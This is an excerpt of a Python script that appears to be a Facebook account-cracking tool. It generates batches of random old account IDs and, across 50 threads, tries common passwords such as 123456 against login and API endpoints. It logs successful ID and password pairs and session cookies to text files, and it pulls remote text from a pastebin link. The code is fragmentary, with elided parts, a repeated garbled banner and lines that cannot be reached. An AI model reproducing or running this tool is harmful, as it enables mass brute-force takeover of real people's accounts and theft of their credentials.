...
C = '\033[96;1m'
N = '\x1b[0m'
asu = random.choice([W,R,G,B,P,Y,C,N])
import os
try:
	import requests
except ImportError:
...
try:
	jan=requests.get('https://pastebin.com/raw/E76CfS5L').text
except:
	jan='#172'
...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write(
			"\r"+asu+" Anan %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\x1b[1;92m [\033[1;36mF\033[1;32mR\033[1;34m3\033[1;36mO\033[1;35mN\033[1;34m-\033[1;33mO\033[1;31mK\033[1;32m] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [\033[1;34mN\033[1;33mA\033[1;35mD\033[1;36mE\033[1;35mR\033[1;34m-\033[1;33mO\033[1;31mK\033[1;32m ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
...
aou = random.choice([W,R,G,B,P,Y,C,N])
aou2 = random.choice([W,R,G,B,P,Y,C,N])
print('''\x1b[1;91m   ___                                      _____           _
  |_  |                                    |_   _|         | |       | | __ _ _ __  _   _  __ _ _ __ _   _    | | ___   ___ | |
    | |/ _` | '_ \| | | |/ _` | '__| | | |   | |/ _ \ / _ \| |   /\__/ \x1b[1;93m/ (_| | | | | |_| | (_| | |  | |_| |   | | (_) | (_) | |
\____/ \__,_|_| |_|\__,_|\__,_|_|   \__, |   \_/\___/ \___/|_|                                        __/ |
                                    |___/                        ''')

print(' ')
logo = ('''
\x1b[1;91m   ___                                      _____           _
  |_  |                                    |_   _|         | |       | | __ _ _ __  _   _  __ _ _ __ _   _    | | ___   ___ | |
    | |/ _` | '_ \| | | |/ _` | '__| | | |   | |/ _ \ / _ \| |   /\__/ \x1b[1;93m/ (_| | | | | |_| | (_| | |  | |_| |   | | (_) | (_) | |
\____/ \__,_|_| |_|\__,_|\__,_|_|   \__, |   \_/\___/ \___/|_|                                        __/ |
                                    |___/                        
...
'''+asu+'''---------------------------------------------'''+aou2+'''
-_-
this tool for programmer mohmad anan and He love you *°*'''+aou+'''
---------------------------------------------''')
...
\____/ \__,_|_| |_|\__,_|\__,_|_|   \__, |   \_/\___/ \___/|_|                                        __/ |
		...
		self.old()
		exit()
		print(asu+'->>1-crack 2010-2011-2012-2013 januaryيناير')
		
		#print(asu+'->>2-crack 2007/2007')
		
		print("[E]to exit()")
		asu = random.choice([W,R,G,B,P,Y,C,N])
		UZAIR =input(asu+"Choose :")
		if UZAIR in ["n4", "0b4"]:
			pass
		if UZAIR in ["b5", "b05"]:
			self.old2()
	...
	def old(self):
		...
		try:
			for n in range(limit):
				...
				idx=random.choice(['10000069','10000343','10000499','10000076','10000069'])
				__ = idx
				self.id.append(__+str(_))
			#print("\033[1;31m=\033[1;33m=\033[1;34m=\033[1;35m>\033[1;32mID"%(len(self.id))) 
			print("\033[0;93m \033[1;31m=\033[1;33m=\033[1;34m=\033[1;35m>\033[1;32mID \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=50) as coeg:
				print("\033[0;93m->>enter any pass 123456 or 123456789:")
				listpass = '123456,123456789'
				if len(listpass)<=5:
	...
	def old2008(self):
		...
		idx = "6"
		os.system('clear');print(logo)
		limit = int(input("\033[0;93m>>how mony ids need?"))
		if limit>50000:
			exit('لا يجوز اختيار اكثر من 50000')
		else:
			print('')
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r\033[0;92mhit= "+uid+ " | "+pw)
				
				self.ok.append("%s|%s"%(uid, pw))
				open("2009-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				asu = random.choice([W,R,G,B,P,Y,C,N])
				print("\r "+asu+"anan-[\OK\ ] %s | %s"%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("anan-OK.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				print("\r "+asu+"anan-[\OK\ ] %s | %s"%(uid, pw))
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				asu = random.choice([W,R,G,B,P,Y,C,N])
				print(asu+"\r oK %s | %s\033[0;97m"%(uid, pw))
